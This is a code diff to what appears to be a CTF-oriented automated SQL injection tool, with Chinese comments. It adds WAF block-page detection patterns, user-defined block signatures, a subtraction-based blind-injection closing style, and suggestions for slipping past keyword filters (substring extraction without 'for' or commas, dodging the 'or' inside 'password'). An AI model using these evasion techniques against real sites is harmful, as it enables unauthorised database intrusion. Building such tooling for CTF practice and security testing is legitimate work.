@@ -37,6 +37,7 @@ class TargetSpec:
 
     request_interval: float = 0.0             # 每次请求间隔（秒）
     verify_ssl: bool = False                  # CTF 靶场常为自签证书，默认不校验
+    waf_signatures: list = field(default_factory=list)  # 用户自定义拦截页特征（子串或 /正则/）
 
 
 # ---------------------------------------------------------------------------
@@ -68,13 +69,32 @@ SQL_ERROR_PATTERNS = [
 ]
 
 WAF_BLOCK_PATTERNS = [
+    # 通用英文拦截文案
     r"\bwaf\b", r"\bi?d\.waf\b", r"illegal", r"forbidden", r"blocked",
     r"request denied", r"security rule", r"attack detected", r"\bhacked\b",
     r"not acceptable", r"requests appear to be", r"sql injection.*detect",
-    r"非法", r"拦截", r"攻击", r"防火墙",
+    r"invalid character", r"malicious", r"sql injection", r"\binjection\b",
+    r"not allowed", r"access denied", r"\bhack(?:er|ing)?\b",
+    # 中文拦截文案（CTF 常见）
+    r"非法", r"拦截", r"攻击", r"防火墙", r"注入", r"危险", r"敏感",
+    r"黑名单", r"拉黑", r"不允许", r"违规",
+    # 安全产品特征页
+    r"安全狗", r"safedog", r"云锁", r"yunsuo", r"云盾", r"宝塔",
+    r"雷池", r"safeline", r"长亭",
 ]
 
 WAF_BLOCK_STATUS = {400, 403, 406, 418, 429, 501}
+
+
+def sig_match(body_low: str, sig: str) -> bool:
+    """用户自定义拦截特征匹配：普通串=不区分大小写子串；/…/=正则。
+    body 需传入 lower() 后的文本；sig 亦按小写比较。"""
+    if len(sig) >= 3 and sig.startswith("/") and sig.endswith("/"):
+        try:
+            return re.search(sig[1:-1], body_low, re.I) is not None
+        except re.error:
+            return False
+    return sig.lower() in body_low
 
 # 常见 CTF flag 格式：flag{...} / ctfshow{...} / CTF2{...} / DASCTF{...} 等
 FLAG_PATTERN = re.compile(
@@ -89,6 +109,7 @@ class ResponseInfo:
     elapsed_ms: float
     url: str = ""
     headers: dict = field(default_factory=dict)
+    custom_waf_patterns: list = field(default_factory=list)   # 用户自定义拦截特征
 
     @property
     def length(self) -> int:
@@ -110,7 +131,9 @@ class ResponseInfo:
         if self.status_code in WAF_BLOCK_STATUS:
             return True
         low = self.body.lower()
-        return any(re.search(p, low, re.I) for p in WAF_BLOCK_PATTERNS)
+        if any(re.search(p, low, re.I) for p in WAF_BLOCK_PATTERNS):
+            return True
+        return any(sig_match(low, s) for s in self.custom_waf_patterns)
 
     def contains_all(self, *needles: str) -> bool:
         return all(n in self.body for n in needles)
@@ -131,7 +154,12 @@ def similarity(a: ResponseInfo, b: ResponseInfo) -> float:
 # 注入点
 # ---------------------------------------------------------------------------
 
-COMMENT_STYLES = ("#", "-- ", "--+#", "/**/", "quote-close")
+COMMENT_STYLES = ("#", "-- ", "--+#", "/**/", "quote-close", "minus-close")
+
+# 尾部注释方式 → payload 字面量（minus-close：减法盲注用 -' 引号闭合，
+# 替代被滤的 #/--，如 xxx'-(cond)-'）
+_TAIL_LITERALS = {"quote-close": "", "none": "", "minus-close": "-'"}
+
 
 @dataclass
 class InjectionPoint:
@@ -152,6 +180,11 @@ class InjectionPoint:
         return b + self.closure
 
     base_value: str = "1"
+
+    def tail_literal(self) -> str:
+        """尾部处理字面量：# / -- 直接用；quote-close/none 无尾部；
+        minus-close 用 -'（减法盲注的引号闭合收尾）。"""
+        return _TAIL_LITERALS.get(self.comment, self.comment)
 
     def suffix(self) -> str:
         if self.comment == "quote-close":
@@ -196,6 +229,8 @@ BYPASS_SUGGESTIONS = {
     "handler": "prepare 预处理；rename 换表",
     "prepare": "handler；rename + alter",
     "show": "information_schema 查询；sys 库",
+    "for": "ascii(mid(x from i)) 取码点（免 for 免逗号截取单字符）",
+    "password": "该词含 or 子串易被拦；改用 passwd/pwd 等列名或经 information_schema 查列",
 }
 
 
@@ -206,6 +241,7 @@ class WafItem:
     filtered: Optional[bool]   # True=被过滤 False=可用 None=不确定
     evidence: str = ""         # 判定依据（响应特征摘要）
     suggestion: str = ""       # 绕过建议
+    param: str = ""            # 判定所在的参数名（WAF 常按参数分别过滤）
 
     @property
     def status_text(self) -> str:
@@ -214,12 +250,20 @@ class WafItem:
 
 @dataclass
 class WafReport:
-    items: list = field(default_factory=list)
+    items: list = field(default_factory=list)          # 注入参数上的判定（参与 payload 构造决策）
+    param_items: list = field(default_factory=list)    # 其他参数的黑名单快扫（信息展示，不参与构造决策）
     _index: dict = field(default_factory=dict)
 
     def add(self, item: WafItem):
         self.items.append(item)
         self._index[item.token.lower()] = item
+
+    def add_param_item(self, item: WafItem):
+        """其他参数的快扫结果：只入清单，不影响 lookup/is_filtered。
+
+        WAF 常按参数分别过滤（如登录框只查 uname）；uname 上被拦不代表
+        注入参数 passwd 里不能用 union，故 payload 决策只看 items。"""
+        self.param_items.append(item)
 
     def lookup(self, token: str) -> Optional[WafItem]:
         return self._index.get(token.lower())
@@ -234,7 +278,7 @@ class WafReport:
         return it is not None and it.filtered is False
 
     def filtered_list(self) -> list:
-        return [i for i in self.items if i.filtered]
+        return [i for i in self.items + self.param_items if i.filtered]
 
     @property
     def has_waf(self) -> bool:
@@ -242,10 +286,14 @@ class WafReport:
 
     def to_dict(self) -> dict:
         return {"has_waf": self.has_waf,
-                "items": [{"token": i.token, "category": i.category,
+                "items": [{"param": i.param, "token": i.token, "category": i.category,
                            "filtered": i.filtered, "status": i.status_text,
                            "evidence": i.evidence, "suggestion": i.suggestion}
-                          for i in self.items]}
+                          for i in self.items],
+                "param_scan": [{"param": i.param, "token": i.token, "category": i.category,
+                                "filtered": i.filtered, "status": i.status_text,
+                                "evidence": i.evidence, "suggestion": i.suggestion}
+                               for i in self.param_items]}
 
 
 # ---------------------------------------------------------------------------
